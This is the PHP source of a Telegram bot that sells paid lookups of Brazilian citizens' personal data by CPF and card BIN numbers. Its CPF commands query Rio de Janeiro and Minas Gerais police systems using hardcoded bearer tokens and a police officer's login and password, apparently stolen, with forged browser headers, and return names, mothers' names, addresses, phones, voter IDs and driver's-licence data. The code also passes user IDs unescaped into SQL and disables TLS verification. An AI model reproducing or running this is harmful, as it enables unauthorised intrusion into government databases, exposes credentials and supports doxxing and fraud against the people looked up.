<?php echo 'ON'; ?>

<?php


error_reporting(0);

//Data From Webhook
$content = file_get_contents("php://input");
$update = json_decode($content, true);
$chat_id = $update["message"]["chat"]["id"];
$type = $update["message"]["chat"]["type"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$id = $update["message"]["from"]["id"];
$username = $update["message"]["from"]["username"];
$firstname = $update["message"]["from"]["first_name"];
$idioma = $update["message"]["from"]["language_code"];


$dono = "@klzinnn";


//debita saldo do usuario (id , valor)
 // DebitaSaldo (109087373 , 1);

function DebitaSaldo($chat_id , $valor){

    include("./conexao.php");

    $sql = "select count(*) as total from usuarios where usuario = $chat_id";
    $result = mysqli_query($conexao, $sql);
    $row = mysqli_fetch_assoc($result);


    if ($row['total'] == 1){

        $sql = "select * from usuarios where usuario = $chat_id";
        $result = mysqli_query($conexao, $sql);
        $row = mysqli_fetch_assoc($result);

        if ($row['saldo'] > 0){

            $saldo = $row['saldo'];

            if ($saldo - $valor >= 0 ){

                $re = $saldo - $valor;

                $result_usuario = "UPDATE usuarios SET saldo= $re where usuario = $chat_id";
                $resultado_usuario = mysqli_query($conexao, $result_usuario);

            }else{
                $result_usuario = "UPDATE usuarios SET saldo= 0 where usuario = $chat_id";
                $resultado_usuario = mysqli_query($conexao, $result_usuario);
            }

            
        }else{
            return;
        }

        
    }else{
        return;
    }
    
}

//carrega os usuarios  !

include("./conexao.php");
$sql = "select * from usuarios";
$result = mysqli_query($conexao, $sql);

$vip = [];

while ($row = mysqli_fetch_assoc($result)) {
    $vip[] = $row['usuario'];
}

//verifica os usuarios !

if (in_array($chat_id, $vip)) {


    // verifica se tem saldo !
    $sql = "select * from usuarios where usuario = $chat_id";
    $result = mysqli_query($conexao, $sql);
    $row = mysqli_fetch_assoc($result);

    if ($row['saldo'] <=0){
        SendMessage($chat_id , '' , "
⚠️ Fundos insuficientes. Aumente o seu saldo.

\n ✅ 𝗣𝗟𝗔𝗡𝗢𝗦 𝗘 𝗩𝗔𝗟𝗢𝗥𝗘𝗦
━━━━━━━━━━━━━━━━━━━━━━━━━━
25 Créditos - R$ 25 (R$ 1,00 por Consulta)
35 Créditos - R$ 35 (R$ 1,00 por Consulta)
45 Créditos - R$ 45 (R$ 1,00 por Consulta)
50 Créditos - R$ 50 (R$ 1,00 por Consulta)

Consultas Debitando -1 Do Seu Saldo


FORMAS DE PAGAMENTO

TRANSFERÊNCIA PIX


Chamar   : $dono");
        die();
    }


$sql = "select * from usuarios";
$result = mysqli_query($conexao, $sql);

$vip = [];

while ($row = mysqli_fetch_assoc($result))
{
    $vip[] = $row['usuario'];
}



  
$total_users = count($vip);

if ((strpos($message, "!send") === 0) || (strpos($message, "/send") === 0)){
$mensagem = substr($message, 6);
$broadcast = urlencode($mensagem);
if ($id == 970330968 || $id == 1464534086 ) { 

 foreach ($vip as $usuarios) {
  $token = file_get_contents('./config/token.txt');
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$usuarios&text=$broadcast");
   }
SendMessage($chat_id, $message_id, "✅Mensagem enviada para todos usuarios do bot
"); 
}else {
SendMessage($chat_id,$message_id, "⚠️Somente Admins Membro Comum ");
}}

//--------------------------------------------------------------------------------------//

    if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
    	
 
    
 SendMessage($chat_id,$message_id, "Olá $firstname \n
/menu para obter lista de comandos \n
/config para ver configurações do bot \n
/perfil exibe suas informacões saldo etc..\n
/donate doacao para manter bot vivo \n
 ");
 
}


if ((strpos($message, "!donate") === 0)||(strpos($message, "/donate") === 0)){
SendMessageMarkdown($chat_id,$message_id, "Enderecos  	

BTC : `bc1qjf2jjqzt0cl6hylzmr86q5eymv3vmczcjg9nrr` \n
ETH : `0x42138b5e2494e2a80a4783fd3d3a15e955a427f8` \n

 ");
 
}
    
//--------------------------------------------------------------------------------------//

if ((strpos($message, "!config") === 0)||(strpos($message, "/config") === 0)){

	
SendMessage($chat_id,$message_id, "⚙️Informações do bot \n
💾 Versão: 2.0 \n
📆 Date Create: 27/10/2021 \n
⚙️ Linguagem : PHP , MYSQL \n
📥 Ultima Atualização : 19/11/2021 \n
👤Criador Dono bot : @Lxrd_kiny \n ");

   
}

    // exibe o perfil usuario !
    
    $sql = "select * from usuarios where usuario = $chat_id";
    $result = mysqli_query($conexao, $sql);
    $row = mysqli_fetch_assoc($result);
    $creditos = $row['saldo'];

//--------------------------------------------------------------------------------------//

    if ((strpos($message, "!perfil") === 0)||(strpos($message, "/perfil") === 0)){
    if ($type == "supergroup"){
$tipo = "GRUPO";
}else{
$tipo = "PRIVADO";
};

    
SendMessage($chat_id,$message_id, "
📜Suas Informações \n
🆔 Seu ID : $chat_id 
🌍 Idioma : $idioma 
🗄️Tipo Chat : $tipo
💰 Seu saldo em reais : R$ $creditos ");
  
 
}
 
 
  
//------------------------------------------------------------------------------------------------------//

    if ((strpos($message, "!menu") === 0)||(strpos($message, "/menu") === 0)){
  

SendMessageMarkdown($chat_id,$message_id, "
✅ MENU DE COMANDOS
Escolha uma das opções a baixo 

🔴 /bin CONSULTA DADOS BIN
🟢 /cpf CONSULTA CPF PMJER 
🟢 /cpf2 CONSULTA CPF RECEITA 
🟡 /cpf3 CONSULTA CPF RETORNANADO CNH 

✅ MODO DE USO

Query Disponiveis ( / ou ! )

`/bin 506775`
`!cpf 728.613.557-00`   

✅ INDICATIVOS DE ESTABILIDADE

🔴 OFFLINE
🟡 INSTAVEL
🟢 ESTAVEL
");
    
}
//------------------------------------------------------------------------------------------------------//

if ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);


if(empty($bin)){
SendMessage($chat_id,$message_id, "⚠️ Insira Uma Bin");
die();
}

 function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
};

	  $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://bins-ws-api.herokuapp.com/api/'.$bin.'');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
        $r0 = curl_exec($ch);
        
        // Se Api Der Erro Bot Envia Mensagem erro
if (curl_errno($ch)) {
SendMessage($chat_id, $message_id, "⚠️ Erro Grave Na Api  , Contate Admin '.$dono.' ");
die();
}
curl_close($ch);
        
$bin = GetStr($r0, 'bin":"','"');
$tipo = GetStr($r0, 'type":"','"');
$level = GetStr($r0, 'level":"','"');
$bandeira = GetStr($r0, 'brand":"','"');      
$banco = GetStr($r0, 'bank":"','"');  

if ($tipo == ""){
  $tipo = "N/E";
}    

if ($level == ""){
  $level = "N/E";
}    
if ($bandeira == ""){
  $bandeira = "N/E";
}    

if ($banco == ""){
  $banco = "N/E";
}    

if (strpos($r0, 'bin')) {
SendMessageMarkdown($chat_id,$message_id, "
🔎 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗥𝗘𝗔𝗟𝗜𝗭𝗔𝗗𝗔 🔎

Bin : `$bin`
Tipo : `$tipo`
Level : `$level`
Bandeira : `$bandeira`
Banco : `$banco` ");
}else{
SendMessage($chat_id, $message_id, "❌ BIN NAO ENCONTRADA ");
}}


//consulta dados cnh pelo cpf




if ((strpos($message, "!cpf") === 0) || (strpos($message, "/cpf") === 0)){
$cpf = substr($message, 5);


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
};

include("./config/validaCpf.php");
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://seaborne-reconfigur.000webhostapp.com/api.php?consulta='.$cpf.'');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
        $r1 = curl_exec($ch);
    
     
// Se Api Der Erro Bot Envia Mensagem erro
if (curl_errno($ch)) {
SendMessage($chat_id, $message_id, "⚠️ Erro Grave Na Api  , Contate Admin '.$dono.' ");
die();
}
curl_close($ch);
$cns = GetStr($r1, 'cns":"','"');
$nome = GetStr($r1, 'nomeCompleto":"','"');
$nascimento = GetStr($r1, 'dtNascimento":"','"');
$nomeMae = GetStr($r1, 'nomeMae":"','"');



    if (strpos($r1, 'cns')) {
SendMessageMarkdown($chat_id, $message_id, "
🔎 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗥𝗘𝗔𝗟𝗜𝗭𝗔𝗗𝗔 🔎

• CPF: `$cpf`
• CNS: `$cns`
• NOME: `$nome`
• MÃE: `$nomeMae`
• NASCIMENTO: `$nascimento`

Foi Descontado - 1 Credito Pela Consulta"); 
DebitaSaldo($chat_id , 1);
}else{
SendMessage($chat_id, $message_id, "❌ CPF NAO ENCONTRADO ");
}}












if ((strpos($message, "!cpf2") === 0) || (strpos($message, "/cpf2") === 0)){
$cpf = substr($message, 6);
    
    
function puxar($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
};
    
include("./config/validaCpf.php");
     
$keys = array(
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZFVzZXIiOjUzNjU1MiwiSVNfQWRtaW4iOmZhbHNlLCJjcGYiOiIwNzkwMjA5Njc1MCIsIm9wbSI6IkRJUCIsImlhdCI6MTY2MDYyMTMwNH0.dA9BladuYzQYuM04TzpU7crkQ5dtzs_bfm7kKuxOnLc',
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZFVzZXIiOjUxMzk3OSwiSVNfQWRtaW4iOmZhbHNlLCJjcGYiOiIzNzM1NTQ2NTc5MSIsIm9wbSI6IkRJUCIsImlhdCI6MTY2MDYyMTcxOX0.TBs4UnxQSy9npXINPH05DrLSIlTRBKIemr-PiIdIQPs');
$token = $keys[array_rand($keys)]; 
    
    
$ch = curl_init();
    
curl_setopt($ch, CURLOPT_URL, "https://portal.pmerj.rj.gov.br/apisoi/pessoas/getPessoaByCPF/$cpf");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET'); 
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    
$headers = array();
$headers[] = 'Authority: portal.seseg.rj.gov.br';
$headers[] = 'Accept: application/json, text/plain, /';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$token.'';
$headers[] = 'Cookie: PHPSESSID=n7opih1l750hcrs41l3rv6lqm2';
$headers[] = 'Dnt: 1';
$headers[] = 'If-None-Match: W/\"316-FCdQ+WGUreXpiU77lBXhHiApIlI\"';
$headers[] = 'Referer: https://portal.seseg.rj.gov.br/fichapessoa';
$headers[] = 'Sec-Ch-Ua: \"Microsoft Edge\";v=\"105\", \")Not;A=Brand\";v=\"8\", \"Chromium\";v=\"104\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1300.0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$dados = curl_exec($ch);

         
// Se Api Der Erro Bot Envia Mensagem erro
if (curl_errno($ch)) {
SendMessage($chat_id, $message_id, "⚠️ Erro Grave Na Api  , Contate Admin '.$dono.'");
die();
}
curl_close($ch);

$cpf = puxar($dados, 'numeroCPF":"', '"');
$nome = puxar($dados, 'nomeCompleto":"', '"');
$mae = puxar($dados, 'nomeMae":"', '"');
$nascimento = puxar($dados, 'dataNascimento":"', '"');
$stcao_cpf = puxar($dados, 'situacaoCadastral":"', '"');
$reside_exter = puxar($dados, 'identificadorResidenteExterior":"', '"');
$paisMoradia = puxar($dados, 'paisResidencia":"', '"');
$sexo = puxar($dados, 'sexo":"', ',');
$naturezaOcupacao = puxar($dados, 'naturezaOcupacao":"', '"');
$ocupacaoPrincipal = puxar($dados, 'ocupacaoPrincipal":"', '"');
$anoExercito = puxar($dados, 'anoExercicioOcupacao":"', '"');
$tipologradouro = puxar($dados, 'tipoLogradouro":"', '"');
$logradouro = puxar($dados, 'logradouro":"', '"');
$numeroLogrado = puxar($dados, 'numeroLogradouro":"', '"');
$complementoLogradou = puxar($dados, 'complementoLogradouro":"', '"');
$bairro = puxar($dados, 'bairro":"', '"');
$cep = puxar($dados, 'cep":"', '"');
$uf = puxar($dados, 'uf":"', '"');
$municipio = puxar($dados, 'municipio":"', '"');
$ddd = puxar($dados, 'ddd":"', '"');
$telefone = puxar($dados, 'telefone":"', '"');
$regiaoFiscal = puxar($dados, 'regiaoFiscal":"', '"');
$anoObito = puxar($dados, 'anoObito":"', '"');
$indicadorExtrangeiro = puxar($dados, 'indicadorEstrangeiro":"', '"');
$dtaAtualizacao = puxar($dados, 'dataAtualizacao":"', '"');
$tituloEleitor = puxar($dados, 'tituloEleitor":"', '"');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://portal.pmerj.rj.gov.br/apisoi/pessoas/getIfood/'.$cpf.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: portal.pmerj.rj.gov.br';
$headers[] = 'Accept: */*';
$headers[] = 'Access-Control-Request-Method: GET';
$headers[] = 'Access-Control-Request-Headers: authorization,content-type';
$headers[] = 'Origin: http://localhost';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'X-Requested-With: oprj.pmerj.rj.gov.br';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: http://localhost/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

$registrado = puxar($result, 'registered":', '"');
$workingNow = puxar($result, 'workingNow":', '"');
$active = puxar($result, 'active":', '"');
$workedInLastSevenDays = puxar($result, 'workedInLastSevenDays":', '"');
    
    
    
if (strpos($r1, 'nomeCompleto')) {
SendMessageMarkdown($chat_id, $message_id, "
        🔎 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗥𝗘𝗔𝗟𝗜𝗭𝗔𝗗𝗔 🔎


• CPF: `$cpf`
• NOME: `$nome`
• MAE: `$mae`
• NASCIMENTO: `$nascimento`
• SITUAÇÃO DO CPF: `$stcao_cpf`
• RESIDE NO EXTERIOR: `$reside_exter`
• PAIS DE MORADIA: `$paisMoradia`
• SEXO: `$sexo`
• NATUREZA OXUPAÇÃO: `$naturezaOcupacao`
• OCUPAÇÃO PRINCIPAL: `$ocupacaoPrincipal`
• ANO EXERCIO A OCUPAÇÃO: `$anoExercito`
• TIPO LOGRADOURO: `$tipologradouro`
• LOGRADOURO: `$logradouro`
• NUMERO DO LOGRADOURO: `$numeroLogrado`
• COMPLEMENTO: `$complementoLogradou`
• BAIRRO: `$bairro`
• CEP: `$cep`
• UF: `$uf`
• MUNICIPIO: `$municipio`
• DDD: `$ddd`
• TELEFONE: `$telefone`
• REGIAO FISCAL: `$regiaoFiscal`
• ANO DE OBITO: `$anoObito`
• INDICADOR DE ESTRANGEIRO: `$indicadorExtrangeiro`
• DATA DE ATUALIZAÇAO: `$dtaAtualizacao`
• TITULO ELEITORAL: `$tituloEleitor`


• IFOOD

• ESTA REGISTRADO: `$registrado`
• ESTA TRABALHANDO AGORA: `$workingNow`
• ATIVO: `$active`
• TRABALHOU OS ULTIMOS 7 DIAS: `$workedInLastSevenDays`
    
Foi Descontado - 1 Credito Pela Consulta"); 
DebitaSaldo($chat_id , 1);
}else{
SendMessage($chat_id, $message_id, "❌ CPF NAO ENCONTRADO ");
}}









if ((strpos($message, "!cpf3") === 0) || (strpos($message, "/cpf3") === 0)){
    $cpf = substr($message, 6);
    
    
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
};
    
include("./config/validaCpf.php");
     
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://websids-reds.policiamilitar.mg.gov.br//webscraper/v1/condutor");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
    "login": "PM1405026",
    "senha": "sgt+805792",
    "tipoPesquisa": "CPF",
    "tipoCNH": null,
    "cnh": null,
    "ufCNH": null,
    "cpf": "'.$cpf.'"
  }');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: application/json, text/plain, /';
$headers[] = 'Sec-Ch-Ua: \"Microsoft Edge\";v=\"105\", \")Not;A=Brand\";v=\"8\", \"Chromium\";v=\"104\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1300.0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$r1 = curl_exec($ch);

         
// Se Api Der Erro Bot Envia Mensagem erro
if (curl_errno($ch)) {
SendMessage($chat_id, $message_id, "⚠️ Erro Grave Na Api  , Contate Admin '.$dono.' ");
die();
}
curl_close($ch);

$cnh = GetStr($r1, 'cnh":"','"');
$uf = GetStr($r1, 'uf":"','"');
$categoria = GetStr($r1, 'categoria":"','"');
$nome = GetStr($r1, 'nome":"','"');
$rgNumero = GetStr($r1, 'rgNumero":"','"');
$rgOrgaoExpedidor = GetStr($r1, 'rgOrgaoExpedidor":"','"');
$rgUf = GetStr($r1, 'rgUf":"','"');
$dataVencimento = GetStr($r1, 'dataVencimento":"','"');
$dataPrimeiraHabilitacao = GetStr($r1, 'dataPrimeiraHabilitacao":"','"');
$habilitado = GetStr($r1, 'habilitado":"','"');
    
    
    
if (strpos($r1, 'cnh')) {
SendMessageMarkdown($chat_id, $message_id, "
    🔎 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗥𝗘𝗔𝗟𝗜𝗭𝗔𝗗𝗔 🔎
    
• CPF: `$cpf`
• CNH: `$cns`
• NOME: `$nome`
• MÃE: `$nomeMae`
• NASCIMENTO: `$nascimento`
    
Foi Descontado - 1 Credito Pela Consulta"); 
DebitaSaldo($chat_id , 1);
}else{
SendMessage($chat_id, $message_id, "❌ CPF NAO ENCONTRADO ");
}}







function SendMessage($chat_id,$message_id,$message){
    $text = urlencode($message);
    $token = file_get_contents('./config/token.txt');
    file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$text");
    }
    
    
function SendMessageMarkdown($chat_id,$message_id,$message){
       $text = urlencode($message);
       $token = file_get_contents('./config/token.txt');
       file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$text&parse_mode=Markdown");
    }

}
